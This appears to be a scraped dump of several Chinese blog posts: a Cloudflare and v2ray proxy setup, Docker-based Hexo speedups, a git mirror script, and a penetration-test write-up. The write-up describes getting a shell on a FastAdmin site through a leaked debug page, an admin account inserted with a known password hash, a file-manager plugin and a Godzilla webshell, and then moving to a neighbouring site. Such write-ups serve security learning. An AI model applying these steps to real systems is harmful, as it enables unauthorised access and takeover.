在https://github.com/Spedoske/CloudflareScanner/releases/根据系统版本，直接下载编译好的程序。我这里是Mac于是下载CloudflareScanner_v1.1.2_MacOS_x64.tar.gz 12345678910111213#增加执行权限chmod +x CloudflareScanner#执行扫描./CloudflareScanner#请输入扫描协程数(数字越大越快,默认400):#400#请输入tcping次数(默认10):#10#请输入要测试的下载节点个数(默认10):#10#请输入下载测试时间(默认10,单位为秒):#10#开始tcping 该软件每次下载的节点不一定存在访问速度快的IP，因此多运行几次效果更佳。最终会在程序目录下生成result.csv,我们按照下载速度进行排序，就得到当前网络下的高速节点的IP了。如下图所示，本次检索到的IP为:104.18.151.135 如果有多个IP下载速度差别不大，尽量选择PING延迟低的IP。 3.1.2 选择智能DNS服务商 选择智能DNS的原因是其可以针对不同运营商线路分别进行解析，实现不同运营商下自选IP。 这里我选择的是Dnspod平台进行接入，在域名注册商里设置域名NS为以下两条记录： 123lilith.dnspod.netdegree.dnspod.net#请注意，随着时间变化，这两条记录可能会发生变化，具体请参考Dnspod添加域名的指南，一般添加域名后会提示如何操作。 3.1.3 CloudFlarePartner平台接入 个人认为CloudFlarePartner目前认证体系设计的并不恰当，需要使用自己的CF账号密码去登录第三方平台，很容易产生密码泄漏风险。我首先填写了一份CloudFlarePartner申请，如果通过申请，就可以自己搭建平台了。申请的周期比较长，为了尝鲜我暂时修改CF密码为临时密码，使用第三方平台（如萌精灵）进行接入。使用第三方平台，务必小心自己账号密码安全 使用CF账号密码登录=&gt;添加域名=&gt;DNS管理=&gt;添加新记录 这里添加一个A记录，直接输入你的域名 例如dmz.mytool.cc,A 记录填写你服务器的真实IP。 3.1.4 智能DNS解析配置 回到Dnspod,添加一条CNAME解析记录，dmz.mytool.cc解析到dmz.mytool.cc.cdn.cloudflare.net。 再添加一条A记录，并且选择线路为境内或者你当前网络的运营商名称，dmz.mytool.cc解析到步骤1找到的高速IP104.18.151.135 最终配置如图： 至此完成了对源站HTTP请求的加速，如果只是为网站加速，到此就可以了。后面内容为小飞机加速。 3.1.5 小飞机反向代理及SSL配置 在之前，我使用的是v2一键环境，使用的是WebSocket动态端口协议，我们在配置完成CDN后，还需要部署反向代理，以便正常解析协议，后续采用WebSocket+TLS协议。 首先给我们的域名配置SSL。 1234567#这里使用acme脚本来申请Let&#x27;s Encrypt证书curl https://get.acme.sh | sh -s email=admin@war9.cn#申请证书~/.acme.sh/acme.sh --issue --nginx -d dmz.mytool.cc#申请后的原始证书需要安装到其他目录，根据官方文档，请勿使用原始的证书。~/.acme.sh/acme.sh --install-cert -d dmz.mytool.cc --key-file /var/ssl/dmz.mytool.cc/key.pem --fullchain-file /var/ssl/dmz.mytool.cc/cert.pem#至此证书文件就保存至/var/ssl/dmz.mytool.cc目录了。 接下来是Nginx配置。 1234567891011121314151617181920212223242526272829303132333435363738394041server&#123; listen 443 ssl; root /var/www/html; ssl_certificate /var/ssl/dmz.mytool.cc/cert.pem; ssl_certificate_key /var/ssl/dmz.mytool.cc/key.pem; ssl_prefer_server_ciphers on; ssl_ciphers EECDH+AESGCM:EDH+AESGCM; server_name _; location ^~ /.well-known/acme-challenge/ &#123; default_type &quot;text/plain&quot;; root /var/www/html; &#125; location = /.well-known/acme-challenge/ &#123; return 404; &#125; location /lovestory &#123; proxy_redirect off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; set $is_v2ray 0; if ($http_upgrade = &quot;websocket&quot;) &#123; set $is_v2ray 1; &#125; if ($is_v2ray = 1) &#123; # 仅当请求为 WebSocket 时才反代到 V2Ray proxy_pass http://127.0.0.1:2021; &#125; if ($is_v2ray = 0) &#123; # 否则显示正常网页 return 301 https://dmz.mytool.cc; &#125; &#125;&#125; 除了SSL配置外，解释几个关键的配置作用： location ./well-known:Let’s Encrypt申请证书时，需要验证该路径。 location /lovestory: 后续要配置v2的路径伪装，我们将v2的流量伪装到lovestory路径下，其他流量走正常网站页面。 3.1.6 协议修改 这里我使用一键端配置较为方便，我们直接贴关键配置 1234567891011121314151617&#123; &quot;inbounds&quot;: [ &#123; &quot;listen&quot;: &quot;127.0.0.1&quot;, &quot;port&quot;: 2021, &quot;protocol&quot;: &quot;vmess&quot;, &#125;, &quot;streamSettings&quot;: &#123; &quot;network&quot;: &quot;ws&quot;, &quot;wsSettings&quot;: &#123; &quot;path&quot;: &quot;&#x2F;lovestory&quot; &#125; &#125; &#125; ], &#125; 至此就完成了所有配置，重启v2和nginx服务，使得配置生效即可。 4.讲在最后在阅读各种教程文章的时候，我发现我们写博客常常会写某某技术教程，对于没有展现渠道和粉丝的博客（比如我，小丑竟是我自己），很多人在没接触到这个概念或技术名词到时候，很难去直接检索该名词，以获得该技能。 例如本文中讲到的CloudFlare自选IP，这个技术已经流行了几年之久了，网上教程也铺天盖地，然而我却不了解。因此不断学习，增加获得知识面的渠道真的很重要（这里还是要感谢90Team）。 PS：本文中的mytool.cc欲出售，2k给有缘人。^_^","categories":[{"name":"随笔","slug":"myspace","permalink":"https://war9.cn/categories/myspace/"}],"tags":[{"name":"v2ray","slug":"v2ray","permalink":"https://war9.cn/tags/v2ray/"},{"name":"cdn","slug":"cdn","permalink":"https://war9.cn/tags/cdn/"},{"name":"cloudflare","slug":"cloudflare","permalink":"https://war9.cn/tags/cloudflare/"},{"name":"cloudflarepartner","slug":"cloudflarepartner","permalink":"https://war9.cn/tags/cloudflarepartner/"},{"name":"dnspod","slug":"dnspod","permalink":"https://war9.cn/tags/dnspod/"}],"author":"Joe"},{"title":"Hexo加速","slug":"Hexo加速","date":"2021-02-18T14:44:00.000Z","updated":"2021-02-18T17:13:30.597Z","comments":true,"path":"2021/02/18/Hexo加速/","link":"","permalink":"https://war9.cn/2021/02/18/Hexo%E5%8A%A0%E9%80%9F/","excerpt":"","text":"本文将探讨Hexo多个方面的加速，不仅仅局限于访问加速。 1.迁移部署加速当我们拥有多个电脑时，在不同的电脑上部署Hexo进行写作成为一项重复而枯燥的工作。同时，在电脑上部署各种版本的Node，对于前端工作人员也是一个噩梦，前端同学常常需要小心谨慎的将自己的作品和工作中开发的产品环境区分开来。 在现代化开发中，Docker可以极大的缩短开发人员的时间，本文将使用Docker部署Hexo，实现迁移部署加速。 Docker让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 1.1 Docker安装部署 本文基于Linux Ubuntu发行版环境编写 1.Docker安装 123456789101112# 如果安装了旧版本需要先卸载sudo apt-get remove docker docker-engine docker.iosudo apt-get updatesudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-commoncurl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;sudo apt-get updatesudo apt-get install docker-ce=5:18.09.7~3-0~ubuntu-bionic# 指定Docker版本，可以使用命令 apt-cache madison docker-ce 查询docker 版本号# 安装 pip 和 docker-compose文件apt install python-pippip install docker-compose 2.Docker国内镜像源加速 12systemctl stop dockervim /etc/docker/daemon.json 将registry-mirrors设置为国内镜像源,本文中加入了docker默认中国源、163源以及USTC源。daemon.json文件内容为： 123&#123; &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;,&quot;http://hub-mirror.c.163.com&quot;,&quot;https://docker.mirrors.ustc.edu.cn&quot;]&#125; 1.2 编写Docker文件本文目录结构如下： 1234567891011121314151617181920.├── docker-compose.yml├── node│ ├── Dockerfile│ └── entrypoint.sh└── src ├── _admin-config.yml ├── _config.landscape.yml ├── _config.yml ├── _config.yml.backup.yml ├── db.json ├── gulpfile.js ├── node_modules ├── package.json ├── package-lock.json ├── public ├── scaffolds ├── source └── themes docker-compose.yml 负责node环境的控制、环境变量设置、容器文件映射到本地 node目录存放node的Dockerfile以及启动脚本 src目录存放Hexo文件，和容器中的Hexo目录文件相同，互相映射。目录下详细的文件解释本文不展开详述。 Dockerfile文件内容 12345678910111213141516171819202122232425FROM node:14.15#基于node14.15容器镜像构建RUN npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org#设置淘宝源加速WORKDIR &#x2F;appVOLUME &#x2F;app#设置根目录下app目录为博客目录RUN cd &#x2F;app &amp;&amp; npm install hexo-cli -g#安装hexoENV NODE_ENV productionENV NODE_PORT 4000ENV HEXO_GENERATE_WATCH true#设置默认环境变量，可在docker-compose文件中修改默认值EXPOSE 4000COPY entrypoint.sh &#x2F;entrypoint.shRUN [&quot;chmod&quot;, &quot;+x&quot;, &quot;&#x2F;entrypoint.sh&quot;]ENTRYPOINT [&quot;&#x2F;entrypoint.sh&quot;]#设置入口点脚本CMD [&quot;server&quot;] 入口点脚本实现了Hexo的几个核心功能： hexo初始化 hexo生成站点地图 启动hexo服务 hexo-cli接口 文件内容为： 123456789101112131415161718192021222324252627282930#!&#x2F;bin&#x2F;shif [ &quot;$1&quot; &#x3D; &#39;init&#39; ]; then cd &#x2F;app hexo init npm install elif [ &quot;$1&quot; &#x3D; &#39;bash&#39; ]; then &#x2F;bin&#x2F;bashelif [ &quot;$1&quot; &#x3D; &#39;update&#39; ]; then cd &#x2F;app npm install hexo-generator-sitemap --saveelif [ &quot;$1&quot; &#x3D; &#39;server&#39; ]; then cd &#x2F;app#Check Hexo initialized or not hexo list post &gt; &#x2F;tmp&#x2F;posts hexo list category &gt; &#x2F;tmp&#x2F;categories diff &#x2F;tmp&#x2F;posts &#x2F;tmp&#x2F;categories &gt; &#x2F;dev&#x2F;null if [ &quot;$?&quot; &#x3D; &quot;0&quot; ];then cd &#x2F;app hexo init npm install hexo s else hexo s fielse cd &#x2F;app echo &quot;$*&quot; hexo &quot;$*&quot;fi 其中在启动Hexo服务前，该脚本检查了是否安装过Hexo，如果未安装则初始化安装Hexo docker-compose.yml文件内容非常简洁，定义了容器名称、本地Hexo源文件与容器Hexo源文件的映射 123456789version: &quot;3&quot;services: blog: build: &quot;.&#x2F;node&quot; container_name: blog_x9sec_v1 volumes: - &#x2F;Users&#x2F;x9sec&#x2F;blog_new&#x2F;src:&#x2F;app ports: - 4000:4000 1.3 启动运行文件组织好后，仅需要两条命令即可启动我们的博客 12docker-compose builddocker-compose up -d 在启动后，如果我们需要使用hexo g生成静态文章或者hexo d发布文章，可以调用我们的脚本Hexo cli接口，调用方法： 1234docker exec blog_x9sec_v1 /entrypoint.sh g #等价于 hexo gdocker exec blog_x9sec_v1 /entrypoint.sh deploy #等价于 hexo deploy 2.访问加速我们可以使用GitHub Page服务来托管自己的博客，GitHub Page具有免费、使用简单、自带SSL、免费绑定域名且无需你懂得的特点。 但是对于国内用户来说，GitHub Hexo服务访问速度常年不稳定，访问Hexo经常无响应，也比较头疼，下面从几个角度来优化国内Hexo访问速度。 2.1 静态资源CDN一般博客访问速度慢的罪魁祸首当属静态资源了，静态资源一般包含我们的CSS、JavaScript、字体图标、图片等文件，这些文件一般较大，因此将此类文件设置为走CDN便可以极大的提高访问速度。 CDN原理 国内建立多个用于缓存静态页面的服务器 建立缓存区指向国外的站点，将其缓存到到国内的服务器 生成指向国内缓存的CANME（IP地址的别名） 将要加速的域名解析到上述CANME上，实现该域名访问时的加速 国内CDN服务商比较多，可以选择腾讯云COS（Cloud Object Storage）、阿里云OSS（Object Storage Service）、七牛云CDN等，好处自然不用多说，付费，稳定，速度好。 本文来讲一个免费的方案来加速Hexo访问。https://www.jsdelivr.com/jsdelivr是一个针对开源软件的免费CDN加速方案，其支持npm、GitHub、Wordpress的加速。 在Hexo安装好后，可以安装hexo-cdn-jsdelivr插件，来对静态资源进行加速，安装方法： 1npm install hexo-cdn-jsdelivr --save 然后在Hexo的_config.yml加入如下代码： 12345678910111213141516171819202122jsdelivr_cdn: # 如果 use_cdn 被设置为false， 则该插件不会工作 use_cdn: true # 如果 deploy_when_generating 被设置为true, 那么静态资源目录将会在每次使用&#39;hexo g&#39;命令生成hexo项目的时候被推送到github。如果被设置为false，则只会在deploy时被推送。你也可以在该标志设置为false时使用&#39;hexo g cdn&#39;命令手动推送到github。 deploy_when_generating: true # cdn_url_prefix是jsdelivr上你的github仓库(这是专门用来作CDN加速的静态资源仓库而非原hexo项目的部署仓库)的对应网址，应该形如 https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&lt;username for github&gt;&#x2F;&lt;assets repo name&gt;&#x2F; cdn_url_prefix: &lt;你在github上的静态资源仓库对应的jsdelivr网址&gt; # git_repo_url是你github上的静态资源仓库的url，应该形如git@github.com:&lt;username&gt;&#x2F;&lt;repo&gt;.git git_repo_url: &lt;github上的静态资源仓库的url&gt; # 你可以使用Github token来验证推送你的资源仓库。如果不想使用token验证，那么只要将token值设置为空或者注释掉这一行即可。我们不推荐将token直接写在_config.yml中。我们推荐使用环境变量储存token，只要将token值的第一个字符设置为&#39;$&#39;,该插件就会从该环境变量中读取。例如你可以使用&#39;$GITHUB_TOKEN&#39;环境变量来储存token。当使用token验证时，必须通过http(s)连接的方式。更多关于Github token的信息可以去 https:&#x2F;&#x2F;help.github.com&#x2F;articles&#x2F;creating-a-personal-access-token-for-the-command-line 内查看。 token: &lt;your github auth token, optional&gt; # asset_dirs是可选的需要上传至github静态资源仓库的目录列表，其中的每一个资源目录应该是相对于你的hexo项目目录的路径， 例如 assets 或者 source&#x2F;assets 或者 themes&#x2F;&lt;theme name&gt;&#x2F;assets 。如果你只是想用CDN加速你的post中的图片，则可以不设置asset_dirs asset_dirs: - &#x2F;themes&#x2F;simple&#x2F;source&#x2F;css - &#x2F;themes&#x2F;simple&#x2F;source&#x2F;js - &#x2F;themes&#x2F;simple&#x2F;source&#x2F;img - &#x2F;themes&#x2F;simple&#x2F;source&#x2F;fonts 如果你使用了本文第一章的Docker部署，安装该插件，修改配置后，请执行docker-compose restart重启Hexo，以使Hexo生效 配置完成后，还需要在主题模版中对静态资源引用代码进行修改。 Hexo主题中,对于ejs模板使用&lt;%- css(&#39;/assets/path&#39;)%&gt; 来生成CSS引用代码,安装插件后，可以使用&lt;%- cdn_css(&#39;/assets/path&#39;)来生成CDN引用。支持的函数如下： 123456789&lt;!-- 使用举例 --&gt;&lt;%- cdn_css(&#39;style.css&#39;) %&gt;&lt;!-- &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&lt;username&gt;&#x2F;&lt;repo&gt;@latest&#x2F;css&#x2F;style.css&quot;&gt; --&gt;&lt;%- cdn_js(&#39;test.js&#39;) %&gt;&lt;!-- &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&lt;username&gt;&#x2F;&lt;repo&gt;@latest&#x2F;js&#x2F;test.js&quot;&gt;&lt;&#x2F;script&gt; --&gt;&lt;img src&#x3D;&quot;&lt;%- cdn_asset(&#39;assets&#x2F;test.png&#39;) %&gt;&quot;&#x2F;&gt;&lt;!-- &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;&lt;username&gt;&#x2F;&lt;repo&gt;@latest&#x2F;assets&#x2F;test.png&quot;&#x2F;&gt; --&gt; 配置和模板修改完成后，接下来使用hexo g命令时，会将配置的静态资源目录文件上传至你的GitHub仓库中，之后使用hexo deploy命令进行发布，就可以看到加速后的效果了，比如我的博客。 123456789&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Nash-x9&#x2F;blog_assets@latest&#x2F;css&#x2F;bootstrap.min.css?ver&#x3D;4.5.0&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Nash-x9&#x2F;blog_assets@latest&#x2F;css&#x2F;fontawesome.min.css?ver&#x3D;5.13.0&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Nash-x9&#x2F;blog_assets@latest&#x2F;css&#x2F;iconfont.min.css?ver&#x3D;3.1.0&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Nash-x9&#x2F;blog_assets@latest&#x2F;css&#x2F;layer.min.css?ver&#x3D;3.1.1&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;Nash-x9&#x2F;blog_assets@latest&#x2F;css&#x2F;kratos.min.css?ver&#x3D;3.2.5&quot; type&#x3D;&quot;text&#x2F;css&quot; media&#x3D;&quot;all&quot;&gt; 插件原理 1.配置静态资源目录2.插件读取该目录，并将其push到你的另外一个Git仓库（静态资源仓库）中3.利用jsdelivr可以对指定仓库的指定文件进行加速的特性，对静态资源进行加速。 2.2 图床加速目前大家屏幕分辨率越来越高，文章中的图片大小不可避免的越来越大了，对于图片我们也可以使用专门的图床进行加速，这里的加速原理和CDN很类似，也可以使用CDN文中的三款商业产品，本文仅提供思路，不再详细讲述。 2.3 动态解析加速当我们博客同时托管在Coding Page和GitHub Page时，我们可以选择一些支持智能解析的DNS服务进行分地域解析，比如国内用户解析至Coding、国外用户解析至Coding Page。 3.文章撰写加速Hexo使用Markdown作为文章原始语言，之后会将Markdown转换为Html超文本标记语言，好的编辑器是我们加快文章编写速度的良药。这里推荐两个方案： 3.1 使用Hexo-Admin进行文章管理、文章发布仅需要一条命令即可，之后访问你的博客地址/admin即可访问后台。 1npm install hexo-admin --save 这里相同的，如果您使用了前文的Docker部署方式，请执行docker-compose restart重启重启，以使得插件生效 3.2 使用Typora编辑器进行文章编辑Typora是一款免费的Markdown编辑器，支持动态显示效果，同时具有动态显示大纲、可导出PDF、Word、HTML等多种格式的优点。","categories":[{"name":"随笔","slug":"myspace","permalink":"https://war9.cn/categories/myspace/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://war9.cn/tags/Hexo/"},{"name":"Hexo加速","slug":"Hexo加速","permalink":"https://war9.cn/tags/Hexo%E5%8A%A0%E9%80%9F/"},{"name":"Docker","slug":"Docker","permalink":"https://war9.cn/tags/Docker/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://war9.cn/tags/docker-compose/"},{"name":"CDN","slug":"CDN","permalink":"https://war9.cn/tags/CDN/"},{"name":"jsdelivr","slug":"jsdelivr","permalink":"https://war9.cn/tags/jsdelivr/"},{"name":"七牛云","slug":"七牛云","permalink":"https://war9.cn/tags/%E4%B8%83%E7%89%9B%E4%BA%91/"},{"name":"阿里云OSS","slug":"阿里云OSS","permalink":"https://war9.cn/tags/%E9%98%BF%E9%87%8C%E4%BA%91OSS/"},{"name":"腾讯云COS","slug":"腾讯云COS","permalink":"https://war9.cn/tags/%E8%85%BE%E8%AE%AF%E4%BA%91COS/"},{"name":"Hexo-admin","slug":"Hexo-admin","permalink":"https://war9.cn/tags/Hexo-admin/"},{"name":"typora","slug":"typora","permalink":"https://war9.cn/tags/typora/"}],"author":"Joe"},{"title":"记一次普通的渗透测试","slug":"记一次普通的渗透测试","date":"2021-01-18T13:40:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2021/01/18/记一次普通的渗透测试/","link":"","permalink":"https://war9.cn/2021/01/18/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"受疫情影响，2020年积压的各种工作，全都堆在了年尾。苦逼的同时，2021年初做一次渗透测试过程记录，本次渗透测试记录虽不会给人产生WOW的惊喜，但好在过程较为完整。 1.信息搜集先来看看目标站点的各种信息 后端PHP，前端使用layui，路由URL规则看起来像ThinkPHP，那自然想到的是ThinkPHP那些年爆发的命令执行了，准备一把梭！然而，尝试了一番，并没有历史漏洞。 那接着继续信息搜集，这里首先使用的是Tide团队的潮汐在线指纹识别,看了下子域名和旁站信息，资产还不少。 PS:项目关系，这里截图只截图部分。 这里强烈安利一下潮汐，虽然目前指纹识别方面指纹库不是很全，但其集成了域名信息、子域名、旁站、C段等功能，加上是SaaS的模式不会被封IP，因此在信息搜集初步阶段是神兵利器。 扫描出的信息，含有大量登录窗口且界面UI都很类似，应该是同一家外包公司的产品，源码应该也类似。在查看子域名以及旁站资产的时候，发现了关键信息。 总结 ：至此初步信息搜集结束，拿到的信息有ThinkPHP、FastAdmin、宝塔、外包公司、子域名、C段信息等 2.常见漏洞利用宝塔和FastAdmin，首先FastAdmin印证了是ThinkPHP的猜测，有宝塔可以尝试利用宝塔的phpmyAdmin未授权访问漏洞进行利用。 7.4.2(Linux)、7.5.13(Linux)版本的宝塔面板存在未授权访问phpmyAdmin的漏洞，通过访问ip:888/pma则可无需任何登录操作直接进入phpmyAdmin 访问宝塔没有响应，因此将重点放在了FastAdmin上面，FastAdmin在2020年有一个前台Getshell漏洞，漏洞分析可参见http://www.cnpanda.net/codeaudit/777.html，该漏洞利用时，需要目标站点开启注册和前台登录功能。 访问FastAdmin站点，眼前一亮，祖师爷赏饭吃啊，基本是默认的FastAdmin Demo页面，开启了注册。于是上传图片马,访问/fastadmin/public/index/user/_empty?name=../../public/uploads/20210116/4a91d432904c0042bcd038ea96ad4947.jpg，emm，当时僵硬了0.5秒，访问后并不是自己的小马，而是DEBUG页面，这站居然是调试模式。。。 虽然FastAdmin的漏洞没利用成功，但是根据DEBUG页面拿到了数据库的连接信息。 总结：我们依据信息搜集到的内容，对常见的漏洞进行了利用尝试，最终虽然没有利用成功的历史漏洞，但依据DEBUG信息拿到了一台RDS数据库的权限。 3.权限放大拿到的数据库为阿里云RDS，使用Navicat连接数据库，查看admin表，系统拥有两个admin账户，表中含有密码和盐字段。这里百度了一下FastAdmin忘记密码，根据帖子内容添加了一个账户。 https://ask.fastadmin.net/article/43.html 数据库修改fa_admin表的两个字段密码(password)：c13f62012fd6a8fdf06b3452a94430e5密码盐(salt)：rpR6Bv登录密码是 123456 使用添加的账号登录后，发现没有权限访问后台 这里没有提示账号密码错误，添加账户应该是成功了，于是翻看数据库，看有没有权限表之类的。找到了三个关键的表信息，auth_group,auth_group_access,auth_rule 于是将添加的用户添加到admin分组内，成功登录，至此看到了后台界面全貌。 FastAdmin后台提供了插件管理的功能，可以通过安装文件管理插件进行Getshell。官方商店的文件管理需要收费，另外之前一个免费的插件也被下架了，还好在Github找到了此插件的源码。 https://github.com/WenchaoLin/Filex FastAdmin文件管理插件 下载Zip后，在站点=&gt;插件管理=&gt;离线安装安装刚才下载的插件，上传马儿，成功GetShell。 拿到shell后先不急着高兴，先看看能不能旁站跨过去，还是经典的祖师爷赏饭，shell虽然是www用户，但是权限还挺高，可以跨目录。 接着查看一波我们本来的目标，通过站点源码，将数据库信息做一个整理，然后重复前面的操作。 这里站点的数据库不对外开放，监听的本地端口，因此利用哥斯拉的数据库管理功能，连接目标数据库，添加管理员账户。 这里有个小插曲，翻看目标站点源码发现也是FastAdmin，但是通过先前找的忘记密码方法添加上去，提示账号密码错误。于是仔细看了下目标站点的源码，得知其认证方式为 md5(password+salt)，和FastAdmin的认证加密方式并不一样，FastAdmin的认证方式为md5(md5(password)+salt); FastAdmin的认证方式，通过GitHub文件找了一下。 https://github.com/karsonzhang/fastadmin/blob/12a62eaa0512a48ad9e150261170fafa870c3084/application/admin/library/Auth.php#L39 目标站点是Think PHP，因此在application/[module]/controller/Admin.php 就可以找到。 接下来就简单了，php输出一个密码为123456，salt为指定字符串的密文即可。 之后通过哥斯拉，update一下之前创建的账号，将密码更新为刚才输出的密文，成功登录。 总结：通过旁站的数据库权限，成功拿到了目标服务器的后台系统权限。整体思路为寻找后台认证加密方式=&gt;添加系统账户=&gt;GetShell=&gt;横向目标=&gt;寻找认证加密方式=&gt;添加系统账户。 另外由于各个站点之间没有隔离，旁站的shell和目标站点的shell没有差别，无需继续，至此渗透结束。","categories":[{"name":"信息安全","slug":"security","permalink":"https://war9.cn/categories/security/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://war9.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"fastadmin","slug":"fastadmin","permalink":"https://war9.cn/tags/fastadmin/"},{"name":"getshell","slug":"getshell","permalink":"https://war9.cn/tags/getshell/"},{"name":"旁站","slug":"旁站","permalink":"https://war9.cn/tags/%E6%97%81%E7%AB%99/"}],"author":"Joe shengxin"},{"title":"Git仓库同步附脚本","slug":"Git仓库迁移附脚本","date":"2020-08-21T20:19:00.000Z","updated":"2021-02-18T13:06:57.081Z","comments":true,"path":"2020/08/21/Git仓库迁移附脚本/","link":"","permalink":"https://war9.cn/2020/08/21/Git%E4%BB%93%E5%BA%93%E8%BF%81%E7%A7%BB%E9%99%84%E8%84%9A%E6%9C%AC/","excerpt":"","text":"记一次Git仓库同步前言 在开发过程中，可能遇到Git仓库搬家或Git仓库同步的窘境，本文记录一次Git仓库同步过程，同样也可用于仓库迁移。 实现思路 环境：仅拥有仓库A的读权限，不具备修改和推送的权限。 目标：将仓库A的代码定期推送/同步至仓库B 不论何种方法都需要定期更新代码，这块可以使用crontab来简单实现，因此不做详细记录。 需求到了以后，刚毕业的码媛小A接下了此任务，对于不熟悉Git命令的她打算这样开始： ​ 1.将源码目录code拷贝至code_1 ​ 2.删除code_1目录下的.git文件夹 ​ 3.删除仓库B所有文件 ​ 4.重新初始化code_1目录Git仓库并设置远程仓库为仓库B ​ 5.commit文件，推送至远程仓库B 经过一个下午的努力，第一版的同步脚本成功交付，并稳定运行了一段时间。然而过了不久同事过来提了一个严重的问题，这样虽然可以实现需求，但是原始的commit的信息无法保留，当仓库代码发生变动时，无法得知代码变更，这样和传统的FTP传输文件区别不大。 小A抓紧学习了一天Git命令，发现git push --mirror 可以实现代码同步，同时对于仓库A不具有侵入性，便产生了如下思路。 ​ 1.获取仓库A最后一次提交的时间 ​ 2.使用git push --mirror 将代码推送至仓库B，同时将仓库A最后一次提交时间写入到临时文件/tmp/LAST_MODIFY_TIME ​ 3.在下次执行脚本时，获取最后一次提交时间后，检查提交时间和临时文件里的内容是否一致，一旦不一致继续执行第二步，如果一致则没有代码变更退出程序即可。 Shell脚本实现Git仓库同步/迁移12345678910111213#!/bin/bashTEMP_FILE=&quot;/tmp/LAST_MODIFY_TIME&quot;cd ~/code/ &amp;&amp; modify_time=`git log -1 --format=&quot;%ct&quot;`#切换至code目录，并获取最后一次提交时间的时间戳echo &quot;代码最后一次提交时间:&quot;`git log -1 --format=&quot;%ai&quot;` #输出代码最后一次提交时间if [ -f &quot;$TEMP_FILE&quot; ];then #判断临时文件是否存在，如果存在则读取推送记录修改时间 last_time=`cat $TEMP_FILE`fiif [[ $last_time -ne $modify_time ]];then #判断推送记录修改时间和最后一次提交时间是否相同，不同则使用git push --mirror 推送至仓库B git push --mirror ssh://git@192.168.1.2/develop/code_B.git echo &quot;推送成功&quot; &amp;&amp; echo $modify_time &gt; $TEMP_FILEelse echo &quot;已经是最新代码，无需推送&quot;fi 小记自此小A学会了很多git参数和命令，笔记如下： 1.git log命令可一接受一个–pretty选项，来确定输出的格式. 引用自https://www.cnblogs.com/ckAng/p/11205055.html 比如 ： 如果我们只想输出hash. 1git log --pretty&#x3D;format:&quot;%h&quot; 详细 命令 ： %H: commit hash %h: 缩短的commit hash %T: tree hash %t: 缩短的 tree hash %P: parent hashes %p: 缩短的 parent hashes %an: 作者名字 %aN: mailmap的作者名字 (.mailmap对应，详情参照git-shortlog(1)或者git-blame(1)) %ae: 作者邮箱 %aE: 作者邮箱 (.mailmap对应，详情参照git-shortlog(1)或者git-blame(1)) %ad: 日期 (–date= 制定的格式) %aD: 日期, RFC2822格式 %ar: 日期, 相对格式(1 day ago) %at: 日期, UNIX timestamp %ai: 日期, ISO 8601 格式 %cn: 提交者名字 %cN: 提交者名字 (.mailmap对应，详情参照git-shortlog(1)或者git-blame(1)) %ce: 提交者 email %cE: 提交者 email (.mailmap对应，详情参照git-shortlog(1)或者git-blame(1)) %cd: 提交日期 (–date= 制定的格式) %cD: 提交日期, RFC2822格式 %cr: 提交日期, 相对格式(1 day ago) %ct: 提交日期, UNIX timestamp %ci: 提交日期, ISO 8601 格式 %d: ref名称 %e: encoding %s: commit信息标题 %f: sanitized subject line, suitable for a filename %b: commit信息内容 %N: commit notes %gD: reflog selector, e.g., refs/stash@{1} %gd: shortened reflog selector, e.g., stash@{1} %gs: reflog subject %Cred: 切换到红色 %Cgreen: 切换到绿色 %Cblue: 切换到蓝色 %Creset: 重设颜色 %C(…): 制定颜色, as described in color.branch.* config option %m: left, right or boundary mark %n: 换行 %%: a raw % %x00: print a byte from a hex code %w([[,[,]]]): switch line wrapping, like the -w option of git-shortlog(1) 2.写shell脚本的过程中，小A无意间还学会了linux中date命令的详细使用 1234date +%s #获取当前时间戳 1598016486date +%x #获取日期 2020&#x2F;08&#x2F;21date +%X #获取时间 21:27:27date +%s -r file.jar 